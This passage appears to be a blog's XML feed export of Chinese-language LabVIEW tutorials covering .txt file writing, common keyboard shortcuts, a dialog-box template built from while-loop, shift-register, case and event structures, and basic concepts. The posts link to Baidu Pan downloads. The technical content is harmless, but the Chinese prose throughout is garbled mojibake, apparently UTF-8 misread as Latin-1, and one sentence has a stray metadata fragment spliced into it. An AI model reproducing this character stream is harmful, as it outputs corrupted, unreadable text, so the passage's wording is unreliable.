<p>å¥½äº†ï¼Œæ”¹å¥½äº†å°±æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ—¶é—´å·²ç»è¢«åŠ ä¸Šäº†ã€‚</p>
<p><img src="/assets/labview/rwTxt/testTime.png" alt="testTime"></p>
<h3 id="æœ‰è¶£å®ä¾‹"><a href="#æœ‰è¶£å®ä¾‹" class="headerlink" title="æœ‰è¶£å®ä¾‹"></a>æœ‰è¶£å®ä¾‹</h3><p>å¥½äº†ï¼Œç°åœ¨æ¥å†™ä¸ªæœ‰è¶£çš„å°ç¨‹åºï¼Œå®šæ—¶å­˜å‚¨ä¸€ç»„æ•°æ®è‡³txtæ–‡ä»¶ï¼ŒåŒ…å«äººçš„å§“åã€æ€§åˆ«ã€å¹´é¾„ã€èº«é«˜å’Œåæ—ã€‚å…·ä½“è¦æ±‚å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚</p>
<table>
<thead>
<tr>
<th></th>
<th>å§“å</th>
<th>æ€§åˆ«</th>
<th>å¹´é¾„</th>
<th>èº«é«˜(m)</th>
<th>æ±‰æ—</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ•°æ®ç±»å‹</td>
<td>å­—ç¬¦ä¸²</td>
<td>å­—ç¬¦ä¸²</td>
<td>Byte</td>
<td>Double</td>
<td>å¸ƒå°”</td>
</tr>
<tr>
<td>è¦æ±‚</td>
<td>éšæœº</td>
<td>ç”·/å¥³</td>
<td>12~40</td>
<td>1.40~1.80</td>
<td>T/F</td>
</tr>
</tbody>
</table>
<p>ç¨‹åºæ¡†å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/labview/rwTxt/randomWrite.png" alt="randomWrite"></p>
<p>å¥½äº†ï¼Œç°åœ¨è¿è¡Œç¨‹åºï¼Œçœ‹çœ‹ä¼šæœ‰å“ªäº›æœ‰è¶£çš„åå­—å‘¢ã€‚</p>
<p><img src="/assets/labview/rwTxt/randomTxt.png" alt="randomTxt"></p>
<p>å…³äº.txtæ–‡ä»¶å­˜å‚¨å°±è®²è¿™äº›å§ã€‚ä»¥åè‹¥æ˜¯æœ‰å…¶å®ƒè¿ç”¨æ–¹å¼ï¼Œé‡åˆ°äº†å†å†™ä¸è¿Ÿã€‚</p>
<h2 id="ä¸‹è½½é“¾æ¥"><a href="#ä¸‹è½½é“¾æ¥" class="headerlink" title="ä¸‹è½½é“¾æ¥"></a>ä¸‹è½½é“¾æ¥</h2><p>æ–‡ä¸­æåˆ°çš„ä¸¤ä¸ªviæ–‡ä»¶å·²å…±äº«è‡³ç™¾åº¦ç½‘ç›˜ï¼Œä»¥ä¾›<a href="http://pan.baidu.com/s/1kU7mveZ" target="_blank" rel="noopener">ä¸‹è½½</a>ã€‚</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - å¸¸ç”¨å¿«æ·é”®]]></title>
      <url>https://www.litreily.top/2016/06/06/shrotcuts/</url>
      <content type="html"><![CDATA[<p>ä½œä¸ºä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„ç¼–ç¨‹è½¯ä»¶ï¼Œè‡ªç„¶å°‘ä¸äº†å¤§é‡çš„å¿«æ·é”®æ”¯æŒã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç†Ÿç»ƒä½¿ç”¨è¿™äº›å¿«æ·é”®ï¼Œå¯ä»¥é«˜æ•ˆå®Œæˆç¼–ç è°ƒè¯•è¿‡ç¨‹ï¼Œå‡å°‘æ‰‹åŠ¨æ“ä½œï¼Œæé«˜å·¥ä½œæ•ˆç‡ã€‚</p>
<h2 id="èœå•å¿«æ·é”®"><a href="#èœå•å¿«æ·é”®" class="headerlink" title="èœå•å¿«æ·é”®"></a>èœå•å¿«æ·é”®</h2><p>æ‰“å¼€LabVIEWä¸­çš„&quot;é€‰é¡¹&quot;ç•Œé¢ï¼Œåœ¨&quot;èœå•å¿«æ·é”®&quot;ä¸­å¯ä»¥çœ‹åˆ°æ‰€æœ‰å¯ç”¨çš„å¿«æ·é”®ã€‚å½“ç„¶ï¼Œå¦‚æœè§‰å¾—ä¸å¤Ÿç”¨æˆ–æ˜¯ä¸å…¶å®ƒè½¯ä»¶æœ‰å†²çªï¼Œå¯ä»¥æ‰‹åŠ¨æ·»åŠ æˆ–ä¿®æ”¹æ–°çš„å¿«æ·é”®ã€‚</p>
<p><img src="/assets/labview/shortcuts/editPanel.png" alt="Labview editPanel"></p>
<h2 id="å¸¸ç”¨å¿«æ·é”®"><a href="#å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="å¸¸ç”¨å¿«æ·é”®"></a>å¸¸ç”¨å¿«æ·é”®</h2><p>å¿«æ·é”®è™½å¤šï¼Œä½†å¸¸ç”¨çš„å´æœ‰é™ã€‚æˆ‘ç®€å•å°†å…¶åˆ†ä¸ºé€šç”¨é”®ã€åŠŸèƒ½é”®å’ŒæŠ€å·§é”®ã€‚</p>
<h3 id="é€šç”¨é”®"><a href="#é€šç”¨é”®" class="headerlink" title="é€šç”¨é”®"></a>é€šç”¨é”®</h3><p>æœ‰äº›å¿«æ·é”®æ˜¯å¤§éƒ¨åˆ†è½¯ä»¶å…±æœ‰çš„ï¼Œå…¶åŠŸèƒ½ä¹Ÿç±»ä¼¼ã€‚</p>
<ul>
<li>Ctrl+Nï¼šæ–°å»º</li>
<li>Ctrl+Aï¼šå…¨é€‰</li>
<li>Ctrl+Cï¼šå¤åˆ¶</li>
<li>Ctrl+Vï¼šç²˜è´´</li>
<li>Ctrl+Sï¼šä¿å­˜</li>
<li>Ctrl+Shift+Sï¼šä¿å­˜å…¨éƒ¨</li>
</ul>
<h3 id="åŠŸèƒ½é”®"><a href="#åŠŸèƒ½é”®" class="headerlink" title="åŠŸèƒ½é”®"></a>åŠŸèƒ½é”®</h3><p>åœ¨ä»£ç ç¼–è¾‘è¿‡ç¨‹ä¸­ç»å¸¸ä¼šç”¨åˆ°çš„åŠŸèƒ½æ€§å¿«æ·é”®åŒ…æ‹¬ï¼š</p>
<ul>
<li>Ctrl+Rï¼šè¿è¡Œç¨‹åº</li>
<li>Ctrl+Eï¼šåœ¨å‰é¢æ¿å’Œç¨‹åºæ¡†å›¾ä¹‹é—´åˆ‡æ¢</li>
<li>Ctrl+Hï¼šæ‰“å¼€/å…³é—­å³æ—¶å¸®åŠ©</li>
<li>Ctrl+Bï¼šåˆ é™¤æ–­çº¿</li>
<li>Ctrl+Iï¼šæŸ¥çœ‹å½“å‰VIå±æ€§</li>
<li>Ctrl+Tï¼šå·¦å³ä¸¤æ æ˜¾ç¤ºå‰é¢æ¿å’Œç¨‹åºæ¡†å›¾</li>
<li>Ctrl+Wï¼šå…³é—­å½“å‰ç•Œé¢æˆ–é¡¹ç›®</li>
<li>Ctrl+Qï¼šé€€å‡ºLabVIEW</li>
</ul>
<h3 id="æŠ€å·§é”®"><a href="#æŠ€å·§é”®" class="headerlink" title="æŠ€å·§é”®"></a>æŠ€å·§é”®</h3><ul>
<li>Ctrl+é¼ æ ‡æ‹–åŠ¨ï¼šå¤åˆ¶è¢«é€‰æ§ä»¶æˆ–å‡½æ•°</li>
<li>Ctrl+é¼ æ ‡æ»šè½®ï¼šåˆ‡æ¢å¤šå±‚ç»“æ„çš„å½“å‰ç»“æ„å¸§</li>
<li>Shift+æ§ä»¶ï¼šå°†é¼ æ ‡æ”¹ä¸ºé€‰æ‹©æŒ‡é’ˆï¼Œç”¨äºé€‰ä¸­æŸä¸ªæˆ–å¤šä¸ªæ§ä»¶</li>
<li>åŒå‡»é¼ æ ‡å·¦é”®ï¼šæ·»åŠ æ³¨é‡Š</li>
<li>Ctrl+Shift+é¼ æ ‡æ‹–åŠ¨ï¼šå°†é¼ æ ‡æ”¹ä¸ºæ‰‹å½¢æŒ‡é’ˆï¼Œç”¨äºæ‹–åŠ¨ç¨‹åºæ¡†å›¾</li>
</ul>
<h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><p>å¦‚æœä¸€ä¸ªå‡½æ•°ä»…åŒ…å«ä¸¤ä¸ªè¾“å…¥æ¥å£æ—¶ï¼Œä¾‹å¦‚ï¼šåŠ ã€å‡ã€ä¹˜ã€é™¤ã€‚å½“æˆ‘ä»¬è¦åˆ‡æ¢ä¸¤ä¸ªè¾“å…¥æ¥å£çš„è¿çº¿æ—¶ï¼Œä¾‹å¦‚å‡æ³•çš„ä¸¤ä¸ªè¾“å…¥Aå’ŒBï¼Œå¼€å§‹è¿æ¥çš„æ—¶å€™æ˜¯A-Bï¼Œç°åœ¨å‘ç°ä¸å¯¹ï¼Œè¦æ”¹æˆB-Aã€‚é»˜è®¤æˆ‘ä»¬ä¼šå»åˆ é™¤ä¸¤æ¡çº¿ç„¶åé‡æ–°è¿æ¥ï¼Œä½†ä½¿ç”¨å¿«æ·é”®<code>Ctrl+Click</code>å¯ä»¥ç›´æ¥å®Œæˆåˆ‡æ¢ã€‚<br><img src="/assets/labview/shortcuts/exchange.gif" alt="Labview exchange"></p>
<p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong>åœ¨ç‚¹å‡»Ctrlåç§»åŠ¨é¼ æ ‡è‡³å‡½æ•°çš„ä»»ä¸€è¾“å…¥ç«¯ï¼Œé¼ æ ‡æŒ‡é’ˆä¼šå˜ä¸ºç±»ä¼¼æ•°å­—8çš„ä¸€ä¸ªå›¾æ ‡ï¼Œæ­¤æ—¶ç‚¹å‡»é¼ æ ‡å·¦é”®å³å¯å®Œæˆåˆ‡æ¢ã€‚</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - å¯¹è¯æ¡†ç¨‹åºæ¨¡æ¿]]></title>
      <url>https://www.litreily.top/2016/06/06/labview-dialog/</url>
      <content type="html"><![CDATA[<p>è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç»å¸¸è¦ä½¿ç”¨å¯¹è¯æ¡†ç•Œé¢ï¼Œä¾‹å¦‚å„ç§å‚æ•°è®¾ç½®ç•Œé¢ç­‰ã€‚ä¸ºäº†å‡å°‘é‡å¤æ€§å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯¹è¯æ¡†æ¨¡æ¿ï¼Œå¾€åå°±å¯ä»¥é€šè¿‡è¯¥æ¨¡æ¿ç›´æ¥æ–°å»ºå¯¹è¯æ¡†ç•Œé¢ã€‚</p>
<h2 id="åˆ›å»ºæ¨¡æ¿"><a href="#åˆ›å»ºæ¨¡æ¿" class="headerlink" title="åˆ›å»ºæ¨¡æ¿"></a>åˆ›å»ºæ¨¡æ¿</h2><h3 id="æ–°å»ºvi"><a href="#æ–°å»ºvi" class="headerlink" title="æ–°å»ºvi"></a>æ–°å»ºvi</h3><p>æ‰“å¼€LabVIEWè½¯ä»¶ï¼Œæ–°å»ºviï¼Œä¿å­˜ä¸º&quot;å¯¹è¯æ¡†æ¨¡æ¿.vi&quot;ã€‚</p>
<p><img src="/assets/labview/dialog/template.png" alt="Labview template.vi"></p>
<h3 id="æ·»åŠ whileå¾ªç¯"><a href="#æ·»åŠ whileå¾ªç¯" class="headerlink" title="æ·»åŠ whileå¾ªç¯"></a>æ·»åŠ whileå¾ªç¯</h3><p>å¯¹è¯æ¡†ç•Œé¢ä¹Ÿå±äºç”¨æˆ·ç•Œé¢ï¼Œæ‰€ä»¥éœ€è¦ç»™å®ƒå•ç‹¬å¼€è¾Ÿä¸€ä¸ªçº¿ç¨‹ï¼Œå³ä¸€ä¸ªwhileå¾ªç¯ã€‚</p>
<p><img src="/assets/labview/dialog/while.png" alt="Labview while"></p>
<h3 id="æ·»åŠ ç§»ä½å¯„å­˜å™¨"><a href="#æ·»åŠ ç§»ä½å¯„å­˜å™¨" class="headerlink" title="æ·»åŠ ç§»ä½å¯„å­˜å™¨"></a>æ·»åŠ ç§»ä½å¯„å­˜å™¨</h3><p>åœ¨whileå¾ªç¯å·¦ä¸Šè§’æ·»åŠ ä¸€ä¸ªç§»ä½å¯„å­˜å™¨ï¼Œç„¶ååˆ›å»ºä¸€ä¸ª<strong>æšä¸¾å¸¸é‡</strong>ï¼Œç»™å…¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>initï¼šåˆå§‹åŒ–</li>
<li>runï¼šè¿è¡Œ</li>
<li>exitï¼šé€€å‡º</li>
</ul>
<p>ç¼–è¾‘å®Œæˆåç‚¹å‡»ç¡®å®šï¼Œç„¶åå°†å…¶è¿æ¥è‡³ç§»ä½å¯„å­˜å™¨çš„è¾“å…¥ç«¯ï¼Œé»˜è®¤è®¾ä¸º&quot;init&quot;ã€‚</p>
<p><img src="/assets/labview/dialog/enum.png" alt="Labview enum"></p>
<h3 id="æ·»åŠ æ¡ä»¶ç»“æ„"><a href="#æ·»åŠ æ¡ä»¶ç»“æ„" class="headerlink" title="æ·»åŠ æ¡ä»¶ç»“æ„"></a>æ·»åŠ æ¡ä»¶ç»“æ„</h3><p>åœ¨whileå¾ªç¯ä¸­æ·»åŠ ä¸€ä¸ªæ¡ä»¶ç»“æ„ï¼Œå°†å°†ç§»ä½å¯„å­˜å™¨çš„å€¼ä½œä¸ºåˆ¤æ–­æ¡ä»¶ã€‚ä¸ºæ¡ä»¶ç»“æ„çš„æ¯ä¸ªå€¼æ·»åŠ åˆ†æ”¯ã€‚</p>
<p><img src="/assets/labview/dialog/switch.png" alt="Labview switch"></p>
<h3 id="æ·»åŠ äº‹ä»¶ç»“æ„"><a href="#æ·»åŠ äº‹ä»¶ç»“æ„" class="headerlink" title="æ·»åŠ äº‹ä»¶ç»“æ„"></a>æ·»åŠ äº‹ä»¶ç»“æ„</h3><p>åœ¨æ¡ä»¶ç»“æ„çš„&quot;run&quot;åˆ†æ”¯ä¸­æ·»åŠ äº‹ä»¶ç»“æ„ï¼Œç”¨äºå“åº”ç”¨æˆ·æ“ä½œã€‚è‡³æ­¤ï¼Œæ‰€éœ€çš„ä¸‰ä¸ªä¸»è¦æ§åˆ¶ç»“æ„å°±éƒ½æœ‰äº†ã€‚</p>
<p><img src="/assets/labview/dialog/event.png" alt="Labview event"></p>
<h3 id="ä¿®æ”¹initåˆ†æ”¯"><a href="#ä¿®æ”¹initåˆ†æ”¯" class="headerlink" title="ä¿®æ”¹initåˆ†æ”¯"></a>ä¿®æ”¹initåˆ†æ”¯</h3><p>åœ¨æ¡ä»¶ç»“æ„çš„&quot;init&quot;ï¼ˆåˆå§‹åŒ–ï¼‰åˆ†æ”¯ä¸­ï¼Œç”¨æˆ·å¯ä»¥æ·»åŠ å¯¹è¯æ¡†çš„<strong>åˆå§‹åŒ–</strong>ç¨‹åºã€‚è¯¥åˆ†æ”¯åªæ‰§è¡Œä¸€æ¬¡ï¼Œæ¥ç€è¿›å…¥&quot;run&quot;ï¼ˆä¸»ç¨‹åºè¿è¡Œï¼‰åˆ†æ”¯ï¼Œæ‰€ä»¥éœ€è¦å°†ç§»ä½å¯„å­˜å™¨çš„å€¼è®¾ä¸º&quot;run&quot;ã€‚</p>
<p><img src="/assets/labview/dialog/init.png" alt="Labview init"></p>
<h3 id="æ·»åŠ å‰é¢æ¿å…³é—­äº‹ä»¶"><a href="#æ·»åŠ å‰é¢æ¿å…³é—­äº‹ä»¶" class="headerlink" title="æ·»åŠ å‰é¢æ¿å…³é—­äº‹ä»¶"></a>æ·»åŠ å‰é¢æ¿å…³é—­äº‹ä»¶</h3><p>ç»™äº‹ä»¶ç»“æ„æ·»åŠ &quot;å‰é¢æ¿å…³é—­ï¼Ÿ&quot;äº‹ä»¶åˆ†æ”¯ï¼Œç„¶åå°†&quot;æ”¾å¼ƒï¼Ÿ&quot;è®¾ä¸ºçœŸï¼Œä¸è®©å‰é¢æ¿åœ¨æ­¤åˆ»å…³é—­ã€‚åŒæ—¶å°†ç§»ä½å¯„å­˜å™¨çš„å€¼è®¾ä¸º&quot;exit&quot;ã€‚</p>
<p><img src="/assets/labview/dialog/closeFront.png" alt="Labview closeFront"></p>
<p><img src="/assets/labview/dialog/exit.png" alt="Labview exit"></p>
<h3 id="æ·»åŠ å¾ªç¯åœæ­¢æ¡ä»¶"><a href="#æ·»åŠ å¾ªç¯åœæ­¢æ¡ä»¶" class="headerlink" title="æ·»åŠ å¾ªç¯åœæ­¢æ¡ä»¶"></a>æ·»åŠ å¾ªç¯åœæ­¢æ¡ä»¶</h3><p>æ‰€æœ‰çš„whileå¾ªç¯éƒ½éœ€è¦ä¸€ä¸ªåœæ­¢æ¡ä»¶ï¼Œè¿™é‡Œçš„whileå¾ªç¯åŒæ ·ä¹Ÿéœ€è¦ï¼Œå…¶åœæ­¢æ¡ä»¶ä¾¿æ˜¯ç§»ä½å¯„å­˜å™¨çš„å€¼å˜ä¸º&quot;exit&quot;ã€‚</p>
<p><img src="/assets/labview/dialog/exitRule.png" alt="Labview exitRule"></p>
<h3 id="å®Œå–„ç§»ä½å¯„å­˜å™¨"><a href="#å®Œå–„ç§»ä½å¯„å­˜å™¨" class="headerlink" title="å®Œå–„ç§»ä½å¯„å­˜å™¨"></a>å®Œå–„ç§»ä½å¯„å­˜å™¨</h3><p>ç°åœ¨çœ‹çœ‹ç¨‹åºï¼Œæ˜¯ä¸æ˜¯è¿˜æ— æ³•æ‰§è¡Œï¼Œå› ä¸ºç§»ä½å¯„å­˜å™¨çš„éƒ¨åˆ†è¿çº¿æ²¡æœ‰èµ‹å€¼ï¼Œç°åœ¨ç®€è¦æ¼”ç¤ºä¸€ä¸‹å®Œå–„è¿‡ç¨‹ã€‚</p>
<p><img src="/assets/labview/dialog/register.gif" alt="Labview register"></p>
<h3 id="æ·»åŠ ç•Œé¢å…³é—­ç¨‹åº"><a href="#æ·»åŠ ç•Œé¢å…³é—­ç¨‹åº" class="headerlink" title="æ·»åŠ ç•Œé¢å…³é—­ç¨‹åº"></a>æ·»åŠ ç•Œé¢å…³é—­ç¨‹åº</h3><p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œåœ¨å…³é—­å‰é¢æ¿æ—¶ï¼Œæˆ‘ä»¬é€‰æ‹©äº†æ”¾å¼ƒï¼Œç„¶åè¿›å…¥&quot;exit&quot;åˆ†æ”¯ï¼Œå°±æ˜¯ä¸ºäº†åœ¨è¿™ä¸ªåˆ†æ”¯ä¸­å¤„ç†ç•Œé¢å…³é—­å‰çš„ä»»åŠ¡ï¼Œä¾‹å¦‚å­˜å‚¨æ•°æ®ï¼Œä¿å­˜ç•Œé¢å‚æ•°ç­‰æ“ä½œã€‚ä¸è¿‡è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨whileå¾ªç¯ç»“æŸæ—¶å…³é—­ç•Œé¢ï¼Œæ­¤å¤„å¯ä»¥ä½¿ç”¨å±æ€§èŠ‚ç‚¹ã€‚</p>
<p><img src="/assets/labview/dialog/exitPanel.png" alt="Labview exitPanel"></p>
<h2 id="è®¾ç½®viå±æ€§"><a href="#è®¾ç½®viå±æ€§" class="headerlink" title="è®¾ç½®viå±æ€§"></a>è®¾ç½®viå±æ€§</h2><p>ä»¥ä¸Šæ“ä½œå®Œæˆäº†å¯¹è¯æ¡†ç•Œé¢çš„ç¨‹åºæ¡†å›¾è®¾è®¡ï¼Œä½†æ­¤æ—¶è¿è¡Œè¯¥å¯¹è¯æ¡†ï¼Œå®ƒè¿˜åŒ…å«äº†ç³»ç»Ÿè‡ªå¸¦çš„èœå•æ å’Œå·¥å…·æ ï¼Œè€Œè¿™äº›éƒ½æ˜¯å¯¹è¯æ¡†ä¸éœ€è¦çš„ã€‚</p>
<p><img src="/assets/labview/dialog/dialog_1.png" alt="Labview dialog"></p>
<p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¿«æ·é”®<code>Ctrl+I</code>æ‰“å¼€<strong>VIå±æ€§</strong>ç•Œé¢ï¼Œåœ¨ç±»åˆ«ä¸­é€‰æ‹©<strong>çª—å£å¤–è§‚</strong>ï¼Œæœ€åé€‰æ‹©<strong>å¯¹è¯æ¡†</strong>ï¼Œç‚¹å‡»ç¡®å®šã€‚</p>
<p><img src="/assets/labview/dialog/dialog_view.png" alt="Labview VI Properties"></p>
<p>åˆ°æ­¤ä¸ºæ­¢ï¼Œä¸€ä¸ªç®€å•çš„å¯¹è¯æ¡†ç•Œé¢æ¨¡æ¿å°±å®Œæˆäº†ï¼Œå¾€åä½¿ç”¨æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡&quot;å¤åˆ¶è¯¥æ¨¡æ¿&rarr;é‡å‘½åviæ–‡ä»¶&rarr;æ·»ç –åŠ ç“¦&quot;å¾—åˆ°æ–°çš„å¯¹è¯æ¡†ã€‚</p>
<p><img src="/assets/labview/dialog/dialog_2.png" alt="Labview dialog"></p>
<p>è¯¥æ¨¡æ¿æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯éå¸¸å®ç”¨ï¼Œå¤§å¤šæ•°è®¾ç½®ç•Œé¢éƒ½å¯ä»¥ä½¿ç”¨è¯¥æ¨¡æ¿è¿›è¡Œè®¾è®¡ã€‚å½“ç„¶ä¹Ÿå¯ä»¥è¿›ä¸€æ­¥å®Œå–„ã€‚ä¾‹å¦‚ï¼Œå¾ˆå¤šè®¾ç½®ç•Œé¢éƒ½æœ‰<strong>åº”ç”¨</strong>æŒ‰é’®å’Œ<strong>é€€å‡º</strong>æŒ‰é’®ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¨¡æ¿ä¸­æ·»åŠ ä¸€ä¸ªåº”ç”¨æŒ‰é’®å’Œä¸€ä¸ªé€€å‡ºæŒ‰é’®ï¼Œå¹¶æ·»åŠ å¯¹åº”çš„æŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼Œä¿®æ”¹ç§»ä½å¯„å­˜å™¨çš„å€¼ã€‚</p>
<h2 id="ä¸‹è½½æ¨¡æ¿"><a href="#ä¸‹è½½æ¨¡æ¿" class="headerlink" title="ä¸‹è½½æ¨¡æ¿"></a>ä¸‹è½½æ¨¡æ¿</h2><p>æˆ‘å°†æ¨¡æ¿å­˜è‡³ç½‘ç›˜ä¾¿äºä¸‹è½½ï¼š<a href="http://pan.baidu.com/s/1pKUe7Ib" target="_blank" rel="noopener">ä¸‹è½½é“¾æ¥</a>ã€‚</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - åŸºæœ¬æ¦‚å¿µ]]></title>
      <url>https://www.litreily.top/2016/06/05/labview-base/</url>
      <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>ã€Šç™¾åº¦ç™¾ç§‘ã€‹è¯æ¡&quot;LabVIEW&quot;ä¸­æåˆ°ï¼š</p>
<blockquote>
<p><strong>LabVIEW</strong>ï¼ˆLaboratory Virtual Instrument Engineering Workbenchï¼‰ç”±ç¾å›½å›½å®¶ä»ªå™¨ï¼ˆNIï¼‰å…¬å¸ç ”åˆ¶å¼€å‘ï¼Œæ˜¯ä¸€ç§ç”¨å›¾æ ‡ä»£æ›¿æ–‡æœ¬è¡Œåˆ›å»ºåº”ç”¨ç¨‹åºçš„å›¾å½¢åŒ–ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒå¹¿æ³›åœ°è¢«å·¥ä¸šç•Œã€å­¦æœ¯ç•Œå’Œç ”ç©¶å®éªŒå®¤æ‰€æ¥å—ï¼Œè§†ä¸ºä¸€ä¸ªæ ‡å‡†çš„æ•°æ®é‡‡é›†å’Œä»ªå™¨æ§åˆ¶è½¯ä»¶ã€‚ä¸<strong>C</strong>å’Œ<strong>BASIC</strong>ä¸€æ ·ï¼ŒLabVIEWä¹Ÿæ˜¯é€šç”¨çš„ç¼–ç¨‹ç³»ç»Ÿï¼Œæœ‰ä¸€ä¸ªå®Œæˆä»»ä½•ç¼–ç¨‹ä»»åŠ¡çš„åºå¤§å‡½æ•°åº“ã€‚é‡‡ç”¨æ•°æ®æµç¼–ç¨‹æ–¹å¼ï¼Œç¨‹åºæ¡†å›¾ä¸­èŠ‚ç‚¹ä¹‹é—´çš„æ•°æ®æµå‘å†³å®šäº†VIåŠå‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚</p>
</blockquote>
<p><img src="/assets/labview/keyWords/Labview.png" alt="Labview"></p>
<h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>åœ¨ä½¿ç”¨LabVIEWè¿›è¡Œè½¯ä»¶å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œå°‘ä¸äº†æåŠä¸€äº›ä¸“æœ‰åè¯å’Œæ¦‚å¿µï¼Œè¿™é‡Œå¯¹å¸¸ç”¨çš„å‡ ä¸ªæ¦‚å¿µè¿›è¡Œç®€è¦è¯´æ˜ã€‚</p>
<h3 id="VI"><a href="#VI" class="headerlink" title="VI"></a>VI</h3><p><strong>VI</strong> æ˜¯categories: LabVIEWï¼ˆVirtual Instrumentï¼‰çš„ç®€ç§°ï¼Œå…¶å¯¹åº”çš„ <strong>.vi</strong> æ–‡ä»¶æ˜¯LabVIEWè½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­ç”¨åˆ°çš„åŸºæœ¬å•å…ƒï¼Œç±»ä¼¼äº <strong>C/C</strong> è¯­è¨€å¼€å‘çš„ <strong>.c/.cpp</strong> æ–‡ä»¶ã€‚æ— è®ºæ˜¯ç”¨äºæ˜¾ç¤ºçš„ç”¨æˆ·ç•Œé¢ï¼Œè¿˜æ˜¯ä¸ç”¨äºæ˜¾ç¤ºçš„å‡½æ•°ï¼Œéƒ½æ˜¯ä»¥ <strong>.vi</strong> æ–‡ä»¶å½¢å¼å­˜åœ¨ã€‚</p>
<h3 id="é¡¹ç›®"><a href="#é¡¹ç›®" class="headerlink" title="é¡¹ç›®"></a>é¡¹ç›®</h3><p>ç›¸å¯¹äºç‹¬ç«‹çš„viæ–‡ä»¶ï¼ŒLabVIEW<strong>é¡¹ç›®</strong>åˆ™æ˜¯ä¸€ä¸ªå¤§çš„å®¹å™¨ï¼Œå®ƒå¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª <strong>.vi</strong> æ–‡ä»¶ï¼Œä»¥åŠå…¶å®ƒç±»å‹çš„ä¾èµ–æ–‡ä»¶ï¼Œå¦‚ <strong>.dll</strong> é“¾æ¥åº“æ–‡ä»¶<strong>.rhm</strong> èœå•æ–‡ä»¶<strong>.lvproj</strong> å·¥ç¨‹æ–‡ä»¶<strong>.lib</strong> å‡½æ•°åº“æ–‡ä»¶<strong>.ctl</strong> è‡ªå®šä¹‰æ§ä»¶æ–‡ä»¶ç­‰ã€‚å½“ç„¶ï¼Œä¸€ä¸ªé¡¹ç›®è¿˜å¯ä»¥åŒ…å«<strong>.txt</strong> ç­‰æ•°æ®æ–‡ä»¶ã€‚ç‹¬ç«‹çš„ <strong>vi</strong> å¯ä»¥å•ç‹¬æ‰§è¡Œï¼Œä½†å¦‚æœéœ€è¦æ‰“åŒ…æˆ <strong>.exe</strong> å¯æ‰§è¡Œæ–‡ä»¶æˆ– <strong>.setup</strong> å®‰è£…åŒ…æ–‡ä»¶ï¼Œå°±å¿…é¡»åˆ›å»º<strong>é¡¹ç›®</strong>æ–‡ä»¶ï¼Œé€šè¿‡ &quot;ç¨‹åºè®¾è®¡è§„èŒƒ&quot; å¯¹é¡¹ç›®æ–‡ä»¶è¿›è¡Œæ‰“åŒ…å¤„ç†ã€‚</p>
<p><img src="/assets/labview/keyWords/project.png" alt="Labview project"></p>
<h3 id="å‰é¢æ¿"><a href="#å‰é¢æ¿" class="headerlink" title="å‰é¢æ¿"></a>å‰é¢æ¿</h3><p>åœ¨LabVIEWå¼€å‘ç¯å¢ƒä¸­ï¼Œviç¨‹åºåˆ†<strong>å‰é¢æ¿</strong>å’Œ<strong>ç¨‹åºæ¡†å›¾</strong>ä¸¤éƒ¨åˆ†ã€‚å…¶ä¸­<strong>å‰é¢æ¿</strong>ç”¨äºè®¾è®¡ç”¨æˆ·ç•Œé¢ï¼Œå¯ä»¥æ”¾ç½®å„ç§ç¨‹åºæ§ä»¶ï¼Œæ˜¯è½¯ä»¶ç”¨æˆ·èƒ½å¤Ÿçœ‹è§çš„äº¤äº’ç•Œé¢ã€‚å¦‚æœä½œä¸ºå‡½æ•°viï¼Œå…¶<strong>å‰é¢æ¿</strong>è¿˜å¯ä»¥è®¾ç½®å‡½æ•°æ¥å£ã€‚è½¯ä»¶å®Œæˆå¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶åï¼Œè½¯ä»¶ç”¨æˆ·ç•Œé¢æ˜¾ç¤ºçš„å°±æ˜¯è¯¥ç•Œé¢æ‰€å¯¹åº”viç¨‹åºçš„<strong>å‰é¢æ¿</strong>ï¼Œè€Œå…¶å®ƒä»…å®ç°æŸç§å‡½æ•°åŠŸèƒ½è€Œæ— 